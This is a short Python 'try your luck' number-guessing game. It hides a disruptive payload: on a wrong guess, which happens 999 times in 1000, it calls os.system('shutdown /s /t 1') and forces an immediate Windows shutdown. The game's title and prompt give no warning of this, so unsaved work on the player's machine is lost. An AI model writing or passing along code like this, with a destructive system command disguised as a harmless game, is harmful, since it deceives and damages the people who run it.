# Created by Natzui Shi
import random
import os

print("TRY YOUR LUCK")
print()

try:
    luck = random.randint(1, 1000)

    luck2 = input("Guess a number 1 to 1000, Input here ▶ ")
    luck2 = int(luck2)

    if luck2 == luck:
        print("Wow, congratulations! Your luck is on another level!")
    else:
        print("Your luck is low, Shutting down.......")
        os.system("shutdown /s /t 1") 

except ValueError:
    print("Please don't use any words or symbols, only numbers.")